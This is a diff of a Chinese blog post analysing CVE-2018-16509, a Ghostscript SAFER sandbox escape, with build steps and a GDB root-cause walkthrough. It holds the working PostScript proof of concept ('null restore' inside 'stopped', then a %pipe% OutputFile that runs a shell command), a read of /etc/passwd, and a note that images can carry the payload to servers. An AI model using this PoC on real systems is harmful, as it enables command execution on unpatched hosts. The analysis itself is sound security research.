@@ -7,22 +7,22 @@
 
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
 
-<title>CVE-2018-16509：Ghostscrpt沙箱绕过漏洞 - Jon Tsang&#39;Blog</title>
+<title>CVE-2018-16509——Ghostscript沙箱逃逸漏洞 - Jon Tsang&#39;Blog</title>
 
 
-    <meta name="description" content="一、背景Ghostscript是Adobe PostScript语言的解释器，能查看以及打印PS、EPS、PDF格式的文件。支持Linux、MacOS、Windows等平台，并且还为ImagineMagic、Python PIL等程序和库所使用。 8月21日，Google安全研究员Tavis Ormandy（@taviso）披露了多个GhostScript的漏洞，在&amp;lt;=9.23的版本中，通构">
+    <meta name="description" content="2018年8月21日，Google安全研究员Tavis Ormandy披露了多个GhostScript的漏洞，在9.24之前的版本中，通构造恶意PostScript脚本，可以绕过SAFER安全沙箱，从而造成文件读取、文件删除甚至命令执行等严重后果。其根本原因是GhostScript解析PostScript的”restore“命令时，会暂时将参数“LockSafetyParams”设置为“False">
 <meta name="keywords" content="漏洞,Linux,ghostscrpt">
 <meta property="og:type" content="article">
-<meta property="og:title" content="CVE-2018-16509：Ghostscrpt沙箱绕过漏洞">
+<meta property="og:title" content="CVE-2018-16509——Ghostscript沙箱逃逸漏洞">
 <meta property="og:url" content="https://jontsang.github.io/post/40555.html">
 <meta property="og:site_name" content="Jon Tsang&#39;Blog">
-<meta property="og:description" content="一、背景Ghostscript是Adobe PostScript语言的解释器，能查看以及打印PS、EPS、PDF格式的文件。支持Linux、MacOS、Windows等平台，并且还为ImagineMagic、Python PIL等程序和库所使用。 8月21日，Google安全研究员Tavis Ormandy（@taviso）披露了多个GhostScript的漏洞，在&amp;lt;=9.23的版本中，通构">
+<meta property="og:description" content="2018年8月21日，Google安全研究员Tavis Ormandy披露了多个GhostScript的漏洞，在9.24之前的版本中，通构造恶意PostScript脚本，可以绕过SAFER安全沙箱，从而造成文件读取、文件删除甚至命令执行等严重后果。其根本原因是GhostScript解析PostScript的”restore“命令时，会暂时将参数“LockSafetyParams”设置为“False">
 <meta property="og:locale" content="zh-CN">
 <meta property="og:image" content="https://raw.githubusercontent.com/JonTsang/Figurebed/master/img/Ghostscript-1.png">
-<meta property="og:updated_time" content="2019-08-23T01:51:30.653Z">
+<meta property="og:updated_time" content="2019-08-23T06:36:42.050Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="CVE-2018-16509：Ghostscrpt沙箱绕过漏洞">
-<meta name="twitter:description" content="一、背景Ghostscript是Adobe PostScript语言的解释器，能查看以及打印PS、EPS、PDF格式的文件。支持Linux、MacOS、Windows等平台，并且还为ImagineMagic、Python PIL等程序和库所使用。 8月21日，Google安全研究员Tavis Ormandy（@taviso）披露了多个GhostScript的漏洞，在&amp;lt;=9.23的版本中，通构">
+<meta name="twitter:title" content="CVE-2018-16509——Ghostscript沙箱逃逸漏洞">
+<meta name="twitter:description" content="2018年8月21日，Google安全研究员Tavis Ormandy披露了多个GhostScript的漏洞，在9.24之前的版本中，通构造恶意PostScript脚本，可以绕过SAFER安全沙箱，从而造成文件读取、文件删除甚至命令执行等严重后果。其根本原因是GhostScript解析PostScript的”restore“命令时，会暂时将参数“LockSafetyParams”设置为“False">
 <meta name="twitter:image" content="https://raw.githubusercontent.com/JonTsang/Figurebed/master/img/Ghostscript-1.png">
 
 
@@ -98,7 +98,7 @@
         <div class="navbar-brand is-flex-center">
             <a class="navbar-item navbar-logo" href="/">
             
-                <img src="/images/logo.svg" alt="CVE-2018-16509：Ghostscrpt沙箱绕过漏洞" height="28">
+                <img src="/images/logo.svg" alt="CVE-2018-16509——Ghostscript沙箱逃逸漏洞" height="28">
             
             </a>
         </div>
@@ -156,7 +156,7 @@
     
     <div class="card-image">
         <span  class="image is-7by1">
-            <img class="thumbnail" src="https://raw.githubusercontent.com/JonTsang/Figurebed/master/img/Ghostscript-1.png" alt="CVE-2018-16509：Ghostscrpt沙箱绕过漏洞">
+            <img class="thumbnail" src="https://raw.githubusercontent.com/JonTsang/Figurebed/master/img/Ghostscript-1.png" alt="CVE-2018-16509——Ghostscript沙箱逃逸漏洞">
         </span>
     </div>
     
@@ -174,7 +174,7 @@
                 <span class="level-item has-text-grey">
                     
                     
-                    12 分钟 读完 (大约 1756 个字)
+                    18 分钟 读完 (大约 2774 个字)
                 </span>
                 
                 
@@ -188,57 +188,138 @@
         
         <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
             
-                CVE-2018-16509：Ghostscrpt沙箱绕过漏洞
+                CVE-2018-16509——Ghostscript沙箱逃逸漏洞
             
         </h1>
         <div class="content">
-            <h2 id="一、背景"><a href="#一、背景" class="headerlink" title="一、背景"></a>一、背景</h2><p>Ghostscript是<a href="https://www.adobe.com/cn/products/postscript.html" target="_blank" rel="noopener">Adobe PostScript</a>语言的解释器，能查看以及打印PS、EPS、PDF格式的文件。支持Linux、MacOS、Windows等平台，并且还为ImagineMagic、Python PIL等程序和库所使用。</p>
-<p>8月21日，Google安全研究员Tavis Ormandy（<a href="https://twitter.com/taviso" target="_blank" rel="noopener">@taviso</a>）披露了多个GhostScript的漏洞，在&lt;=9.23的版本中，通构造恶意PostScript脚本，可以绕过SAFER安全沙箱，从而造成文件读取、文件删除甚至命令执行等严重后果。其根本原因是GhostScript解析<code>restore</code>命令时，会暂时将参数<code>LockSafetyParams</code>设置为<code>False</code>，从而关闭SAFER模式。</p>
+            <p>2018年8月21日，Google安全研究员Tavis Ormandy披露了多个GhostScript的漏洞，在9.24之前的版本中，通构造恶意PostScript脚本，可以绕过SAFER安全沙箱，从而造成文件读取、文件删除甚至命令执行等严重后果。其根本原因是GhostScript解析PostScript的”restore“命令时，会暂时将参数“LockSafetyParams”设置为“False”，从而关闭SAFER模式。</p>
 <a id="more"></a>
 
-<h2 id="二、漏洞细节"><a href="#二、漏洞细节" class="headerlink" title="二、漏洞细节"></a>二、漏洞细节</h2><h3 id="2-1-Ghostscript安全模式（SAFER-mode）"><a href="#2-1-Ghostscript安全模式（SAFER-mode）" class="headerlink" title="2.1 Ghostscript安全模式（SAFER mode）"></a>2.1 Ghostscript安全模式（SAFER mode）</h3><p>Ghostscript包含一个可选的<code>-dSAFER</code>选项，设置该选项启动安全沙箱模式后，与文件相关的操作符将被禁止，具体作用有如下几个：</p>
+<p>开始分析前，先得说一说PostScript——由Adobe开发的一种页面描述语言（PDL），它桌面出版革命中发挥了关键作用。它是世界上第一个与设备无关的页面描述语言，也是一种编程语言。如今世界各地的企业都依赖PostScript来准确地打印来自任何应用程序的文档，同时也为Adobe PDF格式的发展铺平了道路。</p>
+<p>作为一种解释型的语言，PostScript必然需要一个解释器来执行，Ghostscript就是一个广泛应用于各种平台和应用程序的PostScript解释器，ImagineMagic、Python PIL等常用工具都依赖于它。</p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>目前大多数Linux发行版中的GhostScript都应该已经更新了，所以我们需要从源码编译安装，可以从<a href="https://github.com/ArtifexSoftware/ghostpdl-downloads/releases/tag/gs923" target="_blank" rel="noopener">GitHub</a>下载源码，也可以通过git工具下载。</p>
+<p>安装环境：Ubuntu Server 16.04.04 64位<br>集成环境：GCC 5.4.0<br>调试环境：GDB-7.11.1</p>
+<figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-hljs-meta">$</span> tar xvJf ghostscript-9.23.tar.xz</span><br><span class="line"><span class="hljs-hljs-meta">$</span> cd ghostscript-9.23</span><br><span class="line"><span class="hljs-hljs-meta">$</span> apt-get build-dep ghostscript    #安装所需依赖</span><br><span class="line"><span class="hljs-hljs-meta">$</span> CFLAGS="-g -O0" ./configure			 #CFLAGS中的两个选项是为了方便后续的调试</span><br><span class="line"><span class="hljs-hljs-meta">$</span> make</span><br><span class="line"><span class="hljs-hljs-meta">$</span> make install</span><br></pre></td></tr></table></figure>
+
+<p>安装完成就可进入GhostScript的交互界面了</p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ gs -sDEVICE=ppmraw</span><br><span class="line">GPL Ghostscript 9.23 (2018-03-21)</span><br><span class="line">Copyright (C) 2018 Artifex Software, Inc.  All rights reserved.</span><br><span class="line">This software comes with NO WARRANTY: see the file PUBLIC for details.</span><br><span class="line">GS&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="Ghostscript安全模式"><a href="#Ghostscript安全模式" class="headerlink" title="Ghostscript安全模式"></a>Ghostscript安全模式</h3><p>Ghostscript包含一个可选的<code>-dSAFER</code>选项，设置该选项启动安全沙箱模式后，与文件相关的操作符将被禁止，具体作用如下：</p>
 <ol>
-<li>禁用<code>deletefile</code>和<code>renamefile</code>操作符，能够打开管道命令（<code>％pipe％cmd</code>），同时只能打开stdout和stderr进行写入</li>
+<li>禁用deletefile和renamefile操作符，能够打开管道命令（％pipe％cmd），同时只能打开stdout和stderr进行写入</li>
 <li>禁用读取stdin以外的文件</li>
-<li>设置设备的<code>LockSafetyParams</code>参数为True，从而防止使用OutputFile参数写入文件</li>
-<li>阻止<code>/GenericResourceDir</code>、<code>/FontResourceDir</code>、<code>/SystemParamsPassword</code>或<code>/StartJobPassword</code>被更改</li>
+<li>设置设备的LockSafetyParams参数为True，从而防止使用OutputFile参数写入文件</li>
+<li>阻止/GenericResourceDir、/FontResourceDir、/SystemParamsPassword或/StartJobPassword被更改</li>
 </ol>
-<p>例如当我们未加<code>-dSAFER</code>参数时，可以成功读取<code>/etc/passwd</code>文件：<br><img src="https://image.3001.net/images/20180824/1535102086_5b7fcc860ce59.png" alt="/etc/passwd"></p>
-<p>加上<code>-dSAFER</code>参数后，出现<code>invalidfileaccess</code>错误：<br><img src="https://image.3001.net/images/20180824/1535102394_5b7fcdba316b4.png" alt="invalidfileaccess"></p>
-<h3 id="2-2-绕过SAFER沙箱"><a href="#2-2-绕过SAFER沙箱" class="headerlink" title="2.2 绕过SAFER沙箱"></a>2.2 绕过SAFER沙箱</h3><p>多个PostScript操作可以绕过<code>-dSAFER</code>提供的保护，这可以允许攻击者使用任意参数执行命令。首先对Tavis提供的<a href="https://www.exploit-db.com/exploits/45243" target="_blank" rel="noopener">PoC</a>进行测试，在开启了安全沙箱的情况下（-dSAFER），可以成功执行任意shell命令：<br><img src="https://image.3001.net/images/20180824/1535102451_5b7fcdf3ae60c.png" alt></p>
-<p>再比如使用前面背景中提到的ImageMagick工具中的<code>convert</code>命令测试PoC，可以看到ImageMagick同样受到影响：<br><img src="https://image.3001.net/images/20180824/1535102558_5b7fce5eb262e.png" alt></p>
-<p>在源码目录下使用命令<code>grep -r dSAFER</code>找到和该选项相关的信息，看到下面这段注释中说明了该选项的效果——将<code>LockSafetyParams</code>设置为True。<br><img src="https://image.3001.net/images/20180824/1535102608_5b7fce90d3866.png" alt></p>
-<p>再查看和<code>LockSafetyParams</code>相关操作，通过注释看到，这个布尔类型变的量值为<code>true</code>时，可以防止某些不安全的操作。同时在文件psi/zdevice2.c的第269行，该变量被设置为了<code>False</code>，且仅有此处修改了<code>LockSafetyParams</code>的值为False，因此可以推测：PoC中某条PostScript语句解析时导致了这个改变。<br><img src="https://image.3001.net/images/20180824/1535102690_5b7fcee20b7da.png" alt></p>
-<h3 id="2-3-调试分析过程"><a href="#2-3-调试分析过程" class="headerlink" title="2.3 调试分析过程"></a>2.3 调试分析过程</h3><p>接下来进行验证，使用GDB调试Ghostscript并设置好程序参数：</p>
-<figure class="highlight c hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-built_in">set</span> args -q -sDEVICE=ppmraw -dSAFER -sOutputFile=/dev/null</span><br></pre></td></tr></table></figure>
+<p>例如当我们未加<code>-dSAFER</code>参数时，可以成功读取<code>/etc/passwd</code>文件：</p>
+<figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">vuln@ubuntu:~$ gs -q -sDEVICE=ppmraw</span><br><span class="line"><span class="hljs-hljs-meta">GS&gt;</span>/buff 1024 string def</span><br><span class="line"><span class="hljs-hljs-meta">GS&gt;</span>/file_obj (/etc/passwd) (r) file def</span><br><span class="line"><span class="hljs-hljs-meta">GS&gt;</span>file_obj buff readstring</span><br><span class="line">GS&lt;2&gt;buff print</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
 
-<p>根据前面grep的输出，找到“dev_old-&gt;LockSafetyParams = false; ”语句在函数<code>restore_page_device()</code>中，并在此处下断，根据PoC运行程序输入：</p>
-<p>设置成像区域——legal（a4、b5、letter等也可以）：<br><img src="https://image.3001.net/images/20180824/1535102773_5b7fcf35c620e.png" alt="设置成像区域"></p>
-<p>接着输入<code>{null restore} stopped {pop} if</code>，程序中断在此处：<br><img src="https://image.3001.net/images/20180824/1535102796_5b7fcf4cec84b.png" alt="程序中断在此处"></p>
-<p>再对dev_old-&gt;LockSafetyParams变量设置观察点，继续运行程序，和预想的一样，<code>LockSafetyParams</code>的值在这里被改变了。<br><img src="https://image.3001.net/images/20180824/1535102832_5b7fcf70ab4f7.png" alt="LockSafetyParams的值在这里被改变"></p>
-<p>查看栈回溯，发现当前函数在一系列带有“interpret”的函数中被调用，从名称推断这些函数用于解析PostScript语句。<br><img src="https://image.3001.net/images/20180824/1535102868_5b7fcf94a2d21.png" alt></p>
-<p>这里我们在#2处下断，观察到了解释器处理stopped、null、restore等关键字的过程，至此SAFER沙箱如何被绕的过程就逐渐清晰了。<br><img src="https://image.3001.net/images/20180824/1535102928_5b7fcfd0d7ab5.png" alt="绕过SAFER沙箱过程"></p>
-<p><img src="https://image.3001.net/images/20180824/1535102953_5b7fcfe9273b2.png" alt="绕过SAFER沙箱过程"></p>
-<p><img src="https://image.3001.net/images/20180824/1535103001_5b7fd01996188.png" alt="绕过SAFER沙箱过程"></p>
-<h3 id="2-4-探究漏洞成因"><a href="#2-4-探究漏洞成因" class="headerlink" title="2.4 探究漏洞成因"></a>2.4 探究漏洞成因</h3><p>完整过程如下：</p>
-<figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">$</span><span class="hljs-bash"> gs -q -sDEVICE=ppmraw -dSAFER -sOutputFile=/dev/null </span></span><br><span class="line"><span class="hljs-meta">GS&gt;</span><span class="hljs-bash">legal</span></span><br><span class="line"><span class="hljs-meta">GS&gt;</span><span class="hljs-bash">&#123; null restore &#125; stopped &#123; pop &#125; <span class="hljs-keyword">if</span></span></span><br><span class="line"><span class="hljs-meta">GS&gt;</span><span class="hljs-bash">legal</span></span><br><span class="line"><span class="hljs-meta">GS&gt;</span><span class="hljs-bash">mark /OutputFile (%pipe%id) currentdevice putdeviceprops</span></span><br><span class="line">GS&lt;1&gt;showpage</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure>
+<p>加上<code>-dSAFER</code>参数后，出现<code>invalidfileaccess</code>错误：</p>
+<figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">vuln@ubuntu:~$ gs -q -sDEVICE=ppmraw -dSAFER</span><br><span class="line"><span class="hljs-hljs-meta">GS&gt;</span>/buff 1024 string def</span><br><span class="line"><span class="hljs-hljs-meta">GS&gt;</span>/file_obj (/etc/passwd) (r) file def</span><br><span class="line">Error: /invalidfileaccess in --file--</span><br><span class="line">Operand stack:</span><br><span class="line">   file_obj   (/etc/passwd)   (r)</span><br><span class="line">Execution stack:</span><br><span class="line"><span class="hljs-hljs-meta">   %</span>interp_exit   .runexec2   --nostringval--   --nostringval--   --nostringval--   2   %stopped_push   --nostringval--   --nostringval--   %loop_continue   --nostringval--   --nostringval--   false   1   %stopped_push   .runexec2   --nostringval--   --nostringval--   --nostringval--   2   %stopped_push   --nostringval--</span><br><span class="line">Dictionary stack:</span><br><span class="line">   --dict:982/1684(ro)(G)--   --dict:0/20(G)--   --dict:79/200(L)--</span><br><span class="line">Current allocation mode is local</span><br><span class="line">Last OS error: No such file or directory</span><br><span class="line">Current file position is 33</span><br><span class="line">GS&lt;3&gt;</span><br></pre></td></tr></table></figure>
 
-<p>经过上面的分析我们可以知道简单的一条<code>{null restore} stopped {pop} if</code>就能绕过SAFER沙箱，但其原理又是什么呢？</p>
-<p>PostScript是一种“逆波兰式”（Reverse Polish Notation，也称为后缀表达式）的语言。简单来说就是操作数在前，操作符在后。PoC中这条语句是一条典型的PostScript异常处理语句，stopped操作符用于PostScript的异常处理，也就是说stopped执行前面的{}中给出的过程，如果解释器在执行该过程期间出现错误，它将终止该过程并执行stopped操作符之后{}中的过程。</p>
-<p><code>null restore</code>会引起类型检查错误（/typecheck error），同时restore的执行导致LockSafetyParams设置为False，stopped捕获到异常，弹出栈顶元素null，GS继续运行，但此时LockSafetyParams的值还没恢复为True。<br><img src="https://image.3001.net/images/20180824/1535103061_5b7fd05552e72.png" alt></p>
-<p>值得一提的是，GhostScript的官方文档中提到了restore操作符存在导致绕过SAFER模式的风险。<br><img src="https://image.3001.net/images/20180824/1535103081_5b7fd06996ff7.png" alt></p>
-<h2 id="三、漏洞利用"><a href="#三、漏洞利用" class="headerlink" title="三、漏洞利用"></a>三、漏洞利用</h2><p>OutputFile参数用于设置输出文件名，另外在Linux/Unix上，还可以通过设备%pipe%将输出发送到管道（Windows中也可以，需要使用两个%）。例如，要将输出通过管道传输到lpr可以使用：<code>/OutputFile (%pipe%lpr）</code></p>
-<p>查阅官方文档可知，%pipe%功能由popen函数支持，在调试中也能确认这一点：<br><img src="https://image.3001.net/images/20180824/1535103133_5b7fd09d39f5a.png" alt></p>
-<p><img src="https://image.3001.net/images/20180824/1535103145_5b7fd0a94b2db.png" alt></p>
-<p><code>popen()</code>函数通过创建管道的方式，调用<code>fork()</code>启动一个子进程，并将传入<code>popen()</code>的命令送到<code>/bin/sh</code>以-c参数执行。可以通过在此处注入命令实现漏洞利用，如下图中演示的那样，另外将PostScript编码到图像中，可以在使用GhostScript的Web服务器上执行任意指令（例如服务器使用ImageMagick处理上传的图像时）。<br><img src="https://image.3001.net/images/20180824/1535103180_5b7fd0cc3b0df.png" alt></p>
-<p><img src="https://image.3001.net/images/20180824/1535103209_5b7fd0e9aabd2.png" alt></p>
-<h2 id="四、参考资料"><a href="#四、参考资料" class="headerlink" title="四、参考资料"></a>四、参考资料</h2><p>[1]<a href="http://seclists.org/oss-sec/2018/q3/142" target="_blank" rel="noopener">More Ghostscript Issues: Should we disable PS coders in policy.xml by default?</a><br>[2]<a href="https://www.adobe.com/content/dam/acom/en/devnet/actionscript/articles/PLRM.pdf" target="_blank" rel="noopener">PostScript Language Reference(third edition)</a><br>[3]<a href="https://paper.seebug.org/68/" target="_blank" rel="noopener">PostScript语言安全研究(ImageMagick新漏洞分析)</a><br>[4]<a href="https://www.ghostscript.com/doc/9.23/Language.htm" target="_blank" rel="noopener">Ghostscript官方文档</a><br>[6]<a href="https://ruxcon.org.au/assets/2017/slides/hong-ps-and-gs-ruxcon2017.pdf" target="_blank" rel="noopener">A GHOST FROM POSTSCRIPT</a></p>
+<h3 id="PoC分析测试"><a href="#PoC分析测试" class="headerlink" title="PoC分析测试"></a>PoC分析测试</h3><p>多个PostScript操作可以绕过<code>-dSAFER</code>提供的保护，这可以允许攻击者使用任意参数执行命令。首先对Tavis提供的<a href="https://www.exploit-db.com/exploits/45243" target="_blank" rel="noopener">PoC</a>进行测试，在开启了安全沙箱的情况下（-dSAFER），可以成功执行任意shell命令：</p>
+<figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">vuln@ubuntu:~$ gs -q -sDEVICE=ppmraw -dSAFER -sOutputFile=/dev/null</span><br><span class="line"><span class="hljs-hljs-meta">GS&gt;</span>legal</span><br><span class="line"><span class="hljs-hljs-meta">GS&gt;</span>&#123; null restore &#125; stopped &#123; pop &#125; if</span><br><span class="line"><span class="hljs-hljs-meta">GS&gt;</span>legal</span><br><span class="line"><span class="hljs-hljs-meta">GS&gt;</span>mark /OutputFile (%pipe%id) currentdevice putdeviceprops</span><br><span class="line">GS&lt;1&gt;showpage</span><br><span class="line">uid=1000(topsec) gid=1000(topsec) groups=1000(topsec),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)</span><br></pre></td></tr></table></figure>
+
+<p>再比如使用前面提到的ImageMagick工具中的convert命令测试，可以看到ImageMagick同样受到了该漏洞的影响：</p>
+<p><img src="https://raw.githubusercontent.com/JonTsang/Figurebed/master/img/20190823135608.png" alt></p>
+<p>在源码目录下使用命令<code>grep -nr dSAFER</code>找到和该选项相关的信息，看到下面这段注释中说明了该选项的效果——将<code>LockSafetyParams</code>设置为true。</p>
+<p><img src="https://raw.githubusercontent.com/JonTsang/Figurebed/master/img/20190823135640.jpg" alt></p>
+<p>再次使用<code>grep</code>命令查看和<code>LockSafetyParams</code>相关的代码，通过注释看到，这个变量值为<code>true</code>时，可以阻止某些不安全的更改。</p>
+<p><img src="https://raw.githubusercontent.com/JonTsang/Figurebed/master/img/20190823135721.jpg" alt></p>
+<p>同时在文件psi/zdevice2.c的第269行，<code>LockSafetyParams</code>被设置为了<code>False</code>，且仅有此处修改了该变量，因此可以推测：Ghostscript在解析PoC中某条PostScript语句时触发了这段代码。</p>
+<p><img src="https://raw.githubusercontent.com/JonTsang/Figurebed/master/img/20190823135808.jpg" alt></p>
+<h3 id="调试分析过程"><a href="#调试分析过程" class="headerlink" title="调试分析过程"></a>调试分析过程</h3><p>接下来我们通过调试来验证前面的猜想，使用GDB调试Ghostscript并设置好程序参数，根据前面grep的输出，在“dev_old-&gt;LockSafetyParams = false; ”这段代码所在函数<code>restore_page_device()</code>中设置断点。</p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; set args -q -sDEVICE=ppmraw -dSAFER -sOutputFile=/dev/null</span><br><span class="line">pwndbg&gt; b restore_page_device</span><br><span class="line">Breakpoint 1 at 0xa9395e: file ./psi/zdevice2.c, line 256.</span><br><span class="line">pwndbg&gt; r</span><br><span class="line">Starting program: /usr/local/bin/gs -q -sDEVICE=ppmraw -dSAFER -sOutputFile=/dev/null</span><br><span class="line">[Thread debugging using libthread_db enabled]</span><br><span class="line">Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.</span><br><span class="line">GS&gt;</span><br></pre></td></tr></table></figure>
+
+<p>程序运行起来后，根据PoC输入代码：</p>
+<p>首先设置成像区域——legal（a4、b5、letter等也可以）：</p>
+<p><img src="https://raw.githubusercontent.com/JonTsang/Figurebed/master/img/20190823135858.jpg" alt></p>
+<p>接着输入<code>{null restore} stopped {pop} if</code>，程序中断在此处： </p>
+<p><img src="https://raw.githubusercontent.com/JonTsang/Figurebed/master/img/20190823135926.JPG" alt></p>
+<p>再对dev_old-&gt;LockSafetyParams变量设置观察点，继续运行程序两次以后，和我们预想的结果一样——<code>LockSafetyParams</code>的值在这里被改变了。 </p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">Hardware watchpoint 2: dev_old-&gt;LockSafetyParams</span><br><span class="line"></span><br><span class="line">Old value = 1</span><br><span class="line">New value = 0</span><br><span class="line">restore_page_device (pgs_old=0x219cbd8, pgs_new=0x274d630) at ./psi/zdevice2.c:269</span><br><span class="line">269	    dev_old-&gt;LockSafetyParams = false;</span><br></pre></td></tr></table></figure>
+
+<p>这里要注意的是，用例如GCC开启了优化选项（如-O3），那么某些变量可能会被优化掉，比如这里为变量dev_old-&gt;LockSafetyParams设置观察点时，按照默认配置编译的情况下GDB会提示<code>value has been optimized out</code>，这就是前面编译时要使（-O0）的原因，实际上在调试程序时，我们都应该使用该选项。</p>
+<p>使用bt命令查看栈回溯，发现当前函数在一系列带有“interpret”的函数中被调用，从名称推断这些函数用于解析PostScript语句，并且我们现在处于restore操作符相关的函数中。</p>
+<p><img src="https://raw.githubusercontent.com/JonTsang/Figurebed/master/img/20190823140301.jpg" alt></p>
+<p>所以要找到解释器解析操作符的函数，可以使用两次finish命令到栈帧#3中，可以看到interp()函数应该是通过call_operator宏来执行各种操作符的。</p>
+<p><img src="https://raw.githubusercontent.com/JonTsang/Figurebed/master/img/20190823142355.jpg" alt="原本在新浪图床的挂了。。。找不回来了"></p>
+<p>在调用call_operator宏的这一行下断，断下后单步跟进call_operator，观察到了解释器处理stop、restore等操作符的过程，至此SAFER沙箱如何被绕的过程就逐渐清晰了。</p>
+<h2 id="漏洞成因探究"><a href="#漏洞成因探究" class="headerlink" title="漏洞成因探究"></a>漏洞成因探究</h2><p>经过上面的分析我们可以知道简单的一条<code>{null restore} stopped {pop} if</code>就能绕过SAFER沙箱，但其原理又是什么呢，下面就来具体分析一下。</p>
+<p>PostScript是一种“逆波兰式”（也称为后缀表达式）的语言，熟悉数据结构的读者想必立刻就明白了。简单来说，就是将操作数放在操作符之前。例如计算表达式(3 + 4) * (5 - 8)的过程如下：</p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ gs -q -sDEVICE=ppmraw</span><br><span class="line">GS&gt;3 4 add 5 8 sub mul ==</span><br><span class="line">-21</span><br></pre></td></tr></table></figure>
+
+<p>上述代码的每个步骤如下表所示，采用这种方式的好处是不需要对表达式进行语法分析，所以解释器可以设计的较为简单。</p>
+<table>
+<thead>
+<tr>
+<th>处理的符号</th>
+<th>操作</th>
+<th>栈的内容</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>3</td>
+<td>压栈</td>
+<td>3</td>
+</tr>
+<tr>
+<td>4</td>
+<td>压栈</td>
+<td>3 4</td>
+</tr>
+<tr>
+<td>add</td>
+<td>出栈栈顶两个元素，计算加法，计算结果压栈</td>
+<td>7</td>
+</tr>
+<tr>
+<td>5</td>
+<td>压栈</td>
+<td>7 5</td>
+</tr>
+<tr>
+<td>8</td>
+<td>压栈</td>
+<td>7 5 8</td>
+</tr>
+<tr>
+<td>sub</td>
+<td>出栈栈顶两个元素，计算减法，计算结果压栈</td>
+<td>7 -3</td>
+</tr>
+<tr>
+<td>mul</td>
+<td>出栈栈顶两个元素，计算乘法，计算结果压栈</td>
+<td>-21</td>
+</tr>
+<tr>
+<td>==</td>
+<td>出栈栈顶一个元素，并显示</td>
+<td>NULL</td>
+</tr>
+</tbody></table>
+<p>大多数的编程语言都实现了异常处理机制，用于处理软件或信息系统中出现的异常状况（即超出程序正常执行流程的某些特殊条件），同样的PostScript也不例外。我们可以通过将代码包含在<code>{…} stopped</code>中来捕获运算符中的错误，就如同PoC中这样</p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123; </span><br><span class="line">	null restore </span><br><span class="line">&#125; stopped &#123;</span><br><span class="line">	pop</span><br><span class="line">&#125; if</span><br></pre></td></tr></table></figure>
+
+<p>对于大多数运算符而言，null不是合法的操作数，stopped捕获到了前面的语句中发生的错误，它将终止该过程并执行stopped操作符后{}中的过程。</p>
+<p>完整过程如下：</p>
+<p>PostScript中有一对运算符save和restore，分别用来保存和恢复虚拟内存状态的快照，PoC中的<code>null restore</code>语句执行时，相关函数restore_page_device()会将LockSafetyParams设置为false，以便它有权限可以正确配置已恢复的设备，但是还未来得及恢复LockSafetyParams的值便引起类型检查错误（/typecheck error）。接着stopped捕获到异常，弹出栈顶元素null，GS继续运行，此时LockSafetyParams就是一直为false的状态。</p>
+<p><img src="https://raw.githubusercontent.com/JonTsang/Figurebed/master/img/20190823140114.jpg" alt></p>
